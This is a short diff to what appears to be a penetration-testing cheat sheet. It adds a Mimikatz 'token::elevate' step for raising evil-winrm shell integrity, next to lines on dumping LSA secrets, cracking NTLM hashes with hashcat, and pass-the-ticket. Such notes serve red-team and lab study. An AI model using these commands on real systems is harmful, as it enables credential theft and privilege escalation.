@@ -20,6 +20,13 @@ lsadump::lsa [/inject | /patch]
 # hashcat -m 1000 <hash>
 ```
 
+## elevate shell integrity
+
+```bash
+# use when using evil-winrm, we get medium integrity shells
+token::elevate
+```
+
 ## Pass-the-ticket
 
 ```bash
